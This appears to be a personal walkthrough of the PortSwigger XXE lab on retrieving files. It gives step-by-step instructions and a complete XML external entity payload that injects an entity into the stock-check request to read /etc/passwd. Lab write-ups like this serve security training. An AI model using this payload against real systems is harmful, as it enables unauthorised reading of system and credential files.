https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.



1) perform a POST request to /product/stock and we can notice that the body is structured using XML

2) try to define an external entity to read /etc/passwd as:
    <!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >


3) so inject it in the body of the request as
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >
    <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

    &xxe; is used to refer to the external entity defined before

4) send the request and read the file content in the response

